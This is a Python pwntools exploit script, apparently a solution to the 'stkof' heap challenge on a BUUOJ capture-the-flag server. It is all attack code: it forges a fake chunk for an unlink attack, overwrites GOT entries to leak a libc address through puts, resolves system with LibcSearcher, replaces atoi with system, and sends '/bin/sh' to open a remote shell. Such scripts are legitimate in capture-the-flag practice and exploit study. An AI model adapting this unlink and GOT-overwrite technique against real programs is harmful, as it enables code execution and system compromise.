from pwn import *
from LibcSearcher import LibcSearcher
#p = process("./stkof")
p = remote("node3.buuoj.cn",29895)

context.log_level="debug"
def dbg():
    gdb.attach(p)
    pause()

def choice(num):
    p.sendline(str(num))

def add(size):
    choice(1)
    p.sendline(str(size))

def edit( id ,size , text):
    choice(2)
    p.sendline(str(id))
    p.sendline(str(size))
    p.send(text)

def delete(id):
    choice(3)
    p.sendline(str(id))

def show(id):
    choice(4)
    p.sendline(str(id))

ptr_list = 0x602140
free_got = 0x602018
puts_got = 0x602020
puts_plt = 0x400760
atoi_got = 0x602088

add(0x50)
add(0x30)
add(0x90)

payload = p64(0) + p64(0x20) + p64(ptr_list-0x8) + p64(ptr_list) + p64(0x20) + "a"*0x8 + p64(0x30) + "\xa0"

edit(2,len(payload),payload)

delete(3)

payload = "a"*0x8 + p64(free_got)+p64(puts_got) + p64(atoi_got)

edit(2,len(payload),payload)

payload = p64(puts_plt)

edit(0,len(payload),payload)
delete(1)

addr = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
print hex(addr)

libc = LibcSearcher("puts",addr)
libc_base = addr-libc.dump("puts")
system = libc.dump("system") + libc_base

print hex(system)

edit(2,0x8,p64(system))

p.sendline("/bin/sh\x00")
p.interactive()